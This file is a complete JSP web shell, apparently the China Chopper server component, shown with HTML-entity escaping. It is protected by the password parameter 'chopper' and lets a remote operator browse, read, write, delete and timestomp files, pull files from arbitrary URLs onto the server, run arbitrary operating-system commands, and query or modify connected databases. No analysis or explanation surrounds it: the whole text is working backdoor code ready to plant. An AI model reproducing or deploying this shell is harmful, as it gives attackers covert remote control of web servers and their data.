&#60;%@page import=&#34;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&#34;%&#62;
&#60;%!
String Pwd=&#34;chopper&#34;;
String EC(String s,String c)throws Exception{return s;}//new String(s.getBytes(&#34;ISO-8859-1&#34;),c);}
Connection GC(String s)throws Exception{String[] x=s.trim().split(&#34;\r\n&#34;);Class.forName(x[0].trim()).newInstance();
Connection c=DriverManager.getConnection(x[1].trim());if(x.length&#62;2){c.setCatalog(x[2].trim());}return c;}
void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&#60;r.length;i++){sb.append(r[i].toString().substring(0,2));}}
void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&#34;&#34;;java.util.Date dt;
SimpleDateFormat fm=new SimpleDateFormat(&#34;yyyy-MM-dd HH:mm:ss&#34;);for(int i=0;i&#60;l.length;i++){dt=new java.util.Date(l[i].lastModified());
sT=fm.format(dt);sQ=l[i].canRead()?&#34;R&#34;:&#34;&#34;;sQ+=l[i].canWrite()?&#34; W&#34;:&#34;&#34;;if(l[i].isDirectory()){sb.append(l[i].getName()+&#34;/\t&#34;+sT+&#34;\t&#34;+l[i].length()+&#34;\t&#34;+sQ+&#34;\n&#34;);}
else{sF+=l[i].getName()+&#34;\t&#34;+sT+&#34;\t&#34;+l[i].length()+&#34;\t&#34;+sQ+&#34;\n&#34;;}}sb.append(sF);}
void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();
for(int k=0;k&#60;x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}
void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();
ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));
os.write((&#34;-&#62;&#34;+&#34;|&#34;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&#34;|&#34;+&#34;&#60;-&#34;).getBytes(),0,3);os.close();is.close();}
void GG(String s, String d)throws Exception{String h=&#34;0123456789ABCDEF&#34;;int n;File f=new File(s);f.createNewFile();
FileOutputStream os=new FileOutputStream(f);for(int i=0;i&#60;d.length();i+=2)
{os.write((h.indexOf(d.charAt(i))&#60;&#60;4|h.indexOf(d.charAt(i+1))));}os.close();}
void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();
for(int j=0;j&#60;z.length;j++){HH(s+&#34;/&#34;+z[j].getName(),d+&#34;/&#34;+z[j].getName());}
}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);
int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}
void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}
void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&#34;yyyy-MM-dd HH:mm:ss&#34;);
java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}
void LL(String s, String d)throws Exception{URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);
HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];
while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}
void MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));
while((l=br.readLine())!=null){sb.append(l+&#34;\r\n&#34;);}}
void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();
while(r.next()){sb.append(r.getString(1)+&#34;\t&#34;);}r.close();c.close();}
void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={&#34;TABLE&#34;};ResultSet r=c.getMetaData().getTables (null,null,&#34;%&#34;,t);
while(r.next()){sb.append(r.getString(&#34;TABLE_NAME&#34;)+&#34;\t&#34;);}r.close();c.close();}
void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&#34;\r\n&#34;);Connection c=GC(s);
Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&#34;select * from &#34;+x[3]);ResultSetMetaData d=r.getMetaData();
for(int i=1;i&#60;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&#34; (&#34;+d.getColumnTypeName(i)+&#34;)\t&#34;);}r.close();m.close();c.close();}
void QQ(String cs,String s,String q,StringBuffer sb)throws Exception{int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);
try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&#60;=n;i++){sb.append(d.getColumnName(i)+&#34;\t|\t&#34;);
}sb.append(&#34;\r\n&#34;);while(r.next()){for(i=1;i&#60;=n;i++){sb.append(EC(r.getString(i),cs)+&#34;\t|\t&#34;);}sb.append(&#34;\r\n&#34;);}r.close();}
catch(Exception e){sb.append(&#34;Result\t|\t\r\n&#34;);try{m.executeUpdate(q);sb.append(&#34;Execute Successfully!\t|\t\r\n&#34;);
}catch(Exception ee){sb.append(ee.toString()+&#34;\t|\t\r\n&#34;);}}m.close();c.close();}
%&#62;&#60;%
String cs=request.getParameter(&#34;z0&#34;)+&#34;&#34;;request.setCharacterEncoding(cs);response.setContentType(&#34;text/html;charset=&#34;+cs);
String Z=EC(request.getParameter(Pwd)+&#34;&#34;,cs);String z1=EC(request.getParameter(&#34;z1&#34;)+&#34;&#34;,cs);String z2=EC(request.getParameter(&#34;z2&#34;)+&#34;&#34;,cs);
StringBuffer sb=new StringBuffer(&#34;&#34;);try{sb.append(&#34;-&#62;&#34;+&#34;|&#34;);
if(Z.equals(&#34;A&#34;)){String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&#34;\t&#34;);if(!s.substring(0,1).equals(&#34;/&#34;)){AA(sb);}}
else if(Z.equals(&#34;B&#34;)){BB(z1,sb);}else if(Z.equals(&#34;C&#34;)){String l=&#34;&#34;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
while((l=br.readLine())!=null){sb.append(l+&#34;\r\n&#34;);}br.close();}
else if(Z.equals(&#34;D&#34;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
bw.write(z2);bw.close();sb.append(&#34;1&#34;);}else if(Z.equals(&#34;E&#34;)){EE(z1);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;F&#34;)){FF(z1,response);}
else if(Z.equals(&#34;G&#34;)){GG(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;H&#34;)){HH(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;I&#34;)){II(z1,z2);sb.append(&#34;1&#34;);}
else if(Z.equals(&#34;J&#34;)){JJ(z1);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;K&#34;)){KK(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;L&#34;)){LL(z1,z2);sb.append(&#34;1&#34;);}
else if(Z.equals(&#34;M&#34;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);
MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&#34;N&#34;)){NN(z1,sb);}else if(Z.equals(&#34;O&#34;)){OO(z1,sb);}
else if(Z.equals(&#34;P&#34;)){PP(z1,sb);}else if(Z.equals(&#34;Q&#34;)){QQ(cs,z1,z2,sb);}
}catch(Exception e){sb.append(&#34;ERROR&#34;+&#34;:// &#34;+e.toString());}sb.append(&#34;|&#34;+&#34;&#60;-&#34;);out.print(sb.toString());
%&#62;